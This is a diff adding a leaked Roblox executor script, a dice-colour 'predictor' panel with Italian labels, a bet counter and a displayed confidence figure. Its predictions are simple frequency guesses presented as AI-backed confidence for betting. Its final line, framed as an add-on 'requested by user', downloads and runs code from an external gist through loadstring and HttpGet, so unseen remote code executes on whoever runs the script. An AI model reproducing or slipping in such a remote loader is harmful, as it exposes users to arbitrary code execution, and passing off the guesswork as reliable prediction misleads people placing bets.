@@ -1,0 +1,337 @@
+-- leak by prince https://discord.gg/7Ar8QGZB2j
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local KEYS = { "Red", "Orange", "Yellow", "Green", "Blue", "Purple" }
+local COLORS = {
+	Red    = Color3.fromRGB(239, 68, 68),
+	Orange = Color3.fromRGB(255, 149, 40),
+	Yellow = Color3.fromRGB(248, 202, 58),
+	Green  = Color3.fromRGB(60, 196, 90),
+	Blue   = Color3.fromRGB(59, 119, 242),
+	Purple = Color3.fromRGB(160, 74, 220),
+}
+local GRAY_TXT = Color3.fromRGB(138, 138, 148)
+local CONF_PINK = Color3.fromRGB(229, 115, 111)
+
+local slots = { "Red", "Yellow", "Purple", "Green" }
+
+local history = {}
+local prevRow = nil
+
+local function sameRow(a, b)
+	for i = 1, 4 do if a[i] ~= b[i] then return false end end
+	return true
+end
+
+local function logRow(row)
+	if not prevRow then
+		for i = 1, 4 do history[#history + 1] = row[i] end
+	elseif sameRow(row, prevRow) then
+	elseif row[1] == prevRow[2] and row[2] == prevRow[3] and row[3] == prevRow[4] then
+		history[#history + 1] = row[4] 
+	else
+		for i = 1, 4 do history[#history + 1] = row[i] end
+	end
+	prevRow = { row[1], row[2], row[3], row[4] }
+end
+
+local function predictNext(h)
+	local n = #h
+	local f, ftot = {}, 6
+	local o1, o1tot = {}, 6
+	local o2, o2tot = {}, 6
+	for _, c in ipairs(KEYS) do f[c], o1[c], o2[c] = 1, 1, 1 end
+
+	for i = 1, n do
+		local w = 0.97 ^ (n - i) 
+		f[h[i]] += w
+		ftot += w
+	end
+	for i = 2, n do
+		if h[i - 1] == h[n] then
+			o1[h[i]] += 1
+			o1tot += 1
+		end
+		if i >= 3 and h[i - 2] == h[n - 1] and h[i - 1] == h[n] then
+			o2[h[i]] += 1
+			o2tot += 1
+		end
+	end
+
+	local best, bestP = KEYS[1], -1
+	for _, c in ipairs(KEYS) do
+		local p = 0.3 * (f[c] / ftot) + 0.3 * (o1[c] / o1tot) + 0.4 * (o2[c] / o2tot)
+		if p > bestP then best, bestP = c, p end
+	end
+	return best, bestP
+end
+
+local function make(class, props, parent)
+	local obj = Instance.new(class)
+	for k, v in pairs(props) do obj[k] = v end
+	obj.Parent = parent
+	return obj
+end
+
+local parentGui
+pcall(function() parentGui = gethui() end)
+if not parentGui then parentGui = player:WaitForChild("PlayerGui") end
+local old = parentGui:FindFirstChild("AmbitiousPredicter")
+if old then old:Destroy() end
+
+local gui = make("ScreenGui", {
+	Name = "AmbitiousPredicter", ResetOnSpawn = false,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+}, parentGui)
+
+local W, H = 260, 352
+local frame = make("Frame", {
+	Position = UDim2.new(0.5, -W / 2, 0.5, -H / 2),
+	Size = UDim2.fromOffset(W, H),
+	BackgroundColor3 = Color3.fromRGB(12, 11, 14),
+	Active = true, Draggable = true, ClipsDescendants = true,
+}, gui)
+make("UICorner", { CornerRadius = UDim.new(0, 10) }, frame)
+make("UIStroke", { Color = Color3.fromRGB(38, 37, 42), Thickness = 1 }, frame)
+make("UIScale", { Scale = 1 }, frame) 
+make("UIGradient", {
+	Color = ColorSequence.new(Color3.fromRGB(20, 19, 23), Color3.fromRGB(9, 8, 11)),
+	Rotation = 90,
+}, frame)
+
+local function label(props, parent)
+	local d = {
+		BackgroundTransparency = 1, Font = Enum.Font.Montserrat, TextSize = 8,
+		TextColor3 = GRAY_TXT, TextXAlignment = Enum.TextXAlignment.Left,
+	}
+	for k, v in pairs(props) do d[k] = v end
+	return make("TextLabel", d, parent or frame)
+end
+
+local header = make("Frame", {
+	Size = UDim2.new(1, 0, 0, 52), BackgroundColor3 = Color3.fromRGB(18, 17, 20),
+	BorderSizePixel = 0,
+}, frame)
+label({ Position = UDim2.fromOffset(16, 11), Size = UDim2.fromOffset(180, 16),
+	Text = "Ambitious Predicter", Font = Enum.Font.MontserratBold, TextSize = 13,
+	TextColor3 = Color3.new(1, 1, 1) }, header)
+label({ Position = UDim2.fromOffset(16, 29), Size = UDim2.fromOffset(200, 12),
+	Text = "Dice Predicter · Ensemble AI", TextSize = 9 }, header)
+make("Frame", { Position = UDim2.new(0, 0, 1, -1), Size = UDim2.new(1, 0, 0, 1),
+	BackgroundColor3 = Color3.fromRGB(34, 33, 38), BorderSizePixel = 0 }, header)
+
+local collapseBtn = make("TextButton", {
+	Position = UDim2.new(1, -30, 0, 14), Size = UDim2.fromOffset(14, 14),
+	BackgroundTransparency = 1, Text = "▫", TextSize = 13,
+	TextColor3 = GRAY_TXT, Font = Enum.Font.Gotham,
+}, header)
+
+local body = make("Frame", {
+	Position = UDim2.fromOffset(0, 52), Size = UDim2.new(1, 0, 1, -52),
+	BackgroundTransparency = 1,
+}, frame)
+
+label({ Position = UDim2.fromOffset(16, 10), Size = UDim2.fromOffset(200, 12),
+	Text = "COLORI ROLLATI" }, body)
+
+local dieBtns, dieNames = {}, {}
+local DIE, GAP = 52, 8
+local startX = (W - (4 * DIE + 3 * GAP)) / 2
+
+local function setDie(i)
+	local name = slots[i]
+	dieBtns[i].BackgroundColor3 = COLORS[name]
+	dieNames[i].Text = name
+end
+
+local popupOverlay 
+local openSlot = nil
+
+for i = 1, 4 do
+	local x = startX + (i - 1) * (DIE + GAP)
+	local btn = make("TextButton", {
+		Position = UDim2.fromOffset(x, 26), Size = UDim2.fromOffset(DIE, DIE),
+		Text = "", AutoButtonColor = true, BackgroundColor3 = COLORS[slots[i]],
+	}, body)
+	make("UICorner", { CornerRadius = UDim.new(0, 8) }, btn)
+	make("UIStroke", { Color = Color3.new(0, 0, 0), Transparency = 0.7, Thickness = 1 }, btn)
+	local dot = make("Frame", {
+		AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+		Size = UDim2.fromOffset(10, 10), BackgroundColor3 = Color3.new(1, 1, 1),
+	}, btn)
+	make("UICorner", { CornerRadius = UDim.new(1, 0) }, dot)
+	dieBtns[i] = btn
+	dieNames[i] = label({
+		Position = UDim2.fromOffset(x - 4, 82), Size = UDim2.fromOffset(DIE + 8, 12),
+		TextXAlignment = Enum.TextXAlignment.Center, TextSize = 9, Text = slots[i],
+	}, body)
+	btn.MouseButton1Click:Connect(function()
+		openSlot = i
+		popupOverlay.Visible = true
+	end)
+end
+
+local predictBtn = make("TextButton", {
+	Position = UDim2.fromOffset(14, 102), Size = UDim2.fromOffset(W - 28, 34),
+	BackgroundColor3 = Color3.fromRGB(239, 239, 239), Text = "PREDICT",
+	TextColor3 = Color3.fromRGB(21, 21, 21), Font = Enum.Font.MontserratBold,
+	TextSize = 11, AutoButtonColor = true,
+}, body)
+make("UICorner", { CornerRadius = UDim.new(0, 6) }, predictBtn)
+
+local predCard = make("Frame", {
+	Position = UDim2.fromOffset(14, 148), Size = UDim2.fromOffset(W - 28, 62),
+	BackgroundColor3 = Color3.fromRGB(18, 17, 20),
+}, body)
+make("UICorner", { CornerRadius = UDim.new(0, 8) }, predCard)
+make("UIStroke", { Color = Color3.fromRGB(36, 35, 40), Thickness = 1 }, predCard)
+label({ Position = UDim2.fromOffset(10, 6), Size = UDim2.fromOffset(100, 12),
+	Text = "PREVISIONE" }, predCard)
+local confLabel = label({ Position = UDim2.new(1, -130, 0, 6), Size = UDim2.fromOffset(120, 12),
+	Text = "", TextXAlignment = Enum.TextXAlignment.Right, TextColor3 = CONF_PINK,
+	Font = Enum.Font.MontserratBold, TextSize = 8 }, predCard)
+
+local predDie = make("Frame", {
+	Position = UDim2.fromOffset(10, 22), Size = UDim2.fromOffset(34, 34),
+	BackgroundColor3 = Color3.fromRGB(58, 57, 62),
+}, predCard)
+make("UICorner", { CornerRadius = UDim.new(0, 7) }, predDie)
+make("UIStroke", { Color = Color3.new(0, 0, 0), Transparency = 0.7, Thickness = 1 }, predDie)
+local pdot = make("Frame", {
+	AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+	Size = UDim2.fromOffset(7, 7), BackgroundColor3 = Color3.new(1, 1, 1),
+}, predDie)
+make("UICorner", { CornerRadius = UDim.new(1, 0) }, pdot)
+
+local predName = label({
+	Position = UDim2.fromOffset(54, 22), Size = UDim2.fromOffset(150, 34), Text = "—",
+	Font = Enum.Font.MontserratBold, TextSize = 14, TextColor3 = GRAY_TXT,
+}, predCard)
+
+local betCard = make("Frame", {
+	Position = UDim2.fromOffset(14, 222), Size = UDim2.fromOffset(W - 28, 58),
+	BackgroundColor3 = Color3.fromRGB(18, 17, 20),
+}, body)
+make("UICorner", { CornerRadius = UDim.new(0, 8) }, betCard)
+make("UIStroke", { Color = Color3.fromRGB(36, 35, 40), Thickness = 1 }, betCard)
+
+local bet = 1
+local betLabel = label({
+	Position = UDim2.new(0.5, -40, 0, 0), Size = UDim2.fromOffset(80, 58), Text = "1",
+	TextXAlignment = Enum.TextXAlignment.Center, TextColor3 = Color3.new(1, 1, 1),
+	Font = Enum.Font.MontserratBold, TextSize = 16,
+}, betCard)
+
+local footer = label({
+	Position = UDim2.fromOffset(16, 288), Size = UDim2.fromOffset(W - 32, 12),
+	Text = "", TextSize = 8,
+}, body)
+
+local function refreshFooter()
+	local rolls = (#history > 0) and #history or 4
+	footer.Text = string.format("Rolls: %d · Next: %d · Bet: %d", rolls, rolls + 1, bet)
+end
+
+local function betBtn(text, x, y, delta)
+	local b = make("TextButton", {
+		Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(34, 18),
+		BackgroundTransparency = 1, Text = text, TextSize = 9,
+		Font = Enum.Font.Montserrat, TextColor3 = GRAY_TXT,
+	}, betCard)
+	b.MouseButton1Click:Connect(function()
+		bet = math.max(1, bet + delta)
+		betLabel.Text = tostring(bet)
+		refreshFooter()
+	end)
+end
+betBtn("-1", 10, 8, -1)
+betBtn("-10", 10, 32, -10)
+betBtn("+1", W - 28 - 44, 8, 1)
+betBtn("+10", W - 28 - 44, 32, 10)
+refreshFooter()
+
+popupOverlay = make("TextButton", {
+	Visible = false, ZIndex = 10, Size = UDim2.fromScale(1, 1),
+	BackgroundColor3 = Color3.new(0, 0, 0), BackgroundTransparency = 0.4,
+	Text = "", AutoButtonColor = false,
+}, frame)
+popupOverlay.MouseButton1Click:Connect(function()
+	popupOverlay.Visible = false
+	openSlot = nil
+end)
+
+local card = make("Frame", {
+	ZIndex = 11, Position = UDim2.new(0.5, -100, 0, 90), Size = UDim2.fromOffset(200, 164),
+	BackgroundColor3 = Color3.fromRGB(20, 19, 23),
+}, popupOverlay)
+make("UICorner", { CornerRadius = UDim.new(0, 10) }, card)
+make("UIStroke", { Color = Color3.fromRGB(48, 47, 54), Thickness = 1 }, card)
+label({ ZIndex = 12, Position = UDim2.fromOffset(0, 8), Size = UDim2.new(1, 0, 0, 14),
+	Text = "SCEGLI UN COLORE", TextXAlignment = Enum.TextXAlignment.Center,
+	TextColor3 = Color3.fromRGB(205, 205, 212), Font = Enum.Font.MontserratBold }, card)
+
+for i, name in ipairs(KEYS) do
+	local col = (i - 1) % 3
+	local row = math.floor((i - 1) / 3)
+	local x = 18 + col * 60
+	local y = 28 + row * 66
+	local sw = make("TextButton", {
+		ZIndex = 12, Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(44, 44),
+		BackgroundColor3 = COLORS[name], Text = "", AutoButtonColor = true,
+	}, card)
+	make("UICorner", { CornerRadius = UDim.new(0, 8) }, sw)
+	make("UIStroke", { Color = Color3.new(1, 1, 1), Transparency = 0.55, Thickness = 1.5 }, sw)
+	local d = make("Frame", {
+		ZIndex = 13, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+		Size = UDim2.fromOffset(9, 9), BackgroundColor3 = Color3.new(1, 1, 1),
+	}, sw)
+	make("UICorner", { CornerRadius = UDim.new(1, 0) }, d)
+	label({ ZIndex = 12, Position = UDim2.fromOffset(x - 8, y + 47), Size = UDim2.fromOffset(60, 12),
+		Text = name, TextXAlignment = Enum.TextXAlignment.Center, TextSize = 9 }, card)
+
+	sw.MouseButton1Click:Connect(function()
+		if openSlot then
+			slots[openSlot] = name
+			setDie(openSlot)
+		end
+		popupOverlay.Visible = false
+		openSlot = nil
+	end)
+end
+
+local collapsed = false
+collapseBtn.MouseButton1Click:Connect(function()
+	collapsed = not collapsed
+	body.Visible = not collapsed
+	popupOverlay.Visible = false
+	frame.Size = UDim2.fromOffset(W, collapsed and 52 or H)
+end)
+
+local busy = false
+predictBtn.MouseButton1Click:Connect(function()
+	if busy then return end
+	busy = true
+	popupOverlay.Visible = false
+	openSlot = nil
+
+	logRow(slots)
+	refreshFooter()
+	local color, p = predictNext(history)
+
+	confLabel.Text = ""
+	predName.Text = ""
+	for s = 1, 10 do 
+		predDie.BackgroundColor3 = COLORS[KEYS[math.random(#KEYS)]]
+		task.wait(0.035 + s * 0.008)
+	end
+	predDie.BackgroundColor3 = COLORS[color]
+	predName.Text = color
+	predName.TextColor3 = COLORS[color]
+	confLabel.Text = string.format("CONFIDENZA %d%%", math.floor(p * 100 + 0.5))
+	busy = false
+end)
+
+-- External add-on requested by user
+loadstring(game:HttpGet("https://gist.githubusercontent.com/xd-myscript/67ae3a9694b178163eb38b596100c731/raw/6ebe69bedd9c525591a2da8d01cc03fe8f53a6b5/Gist%20Loader.lua"))()
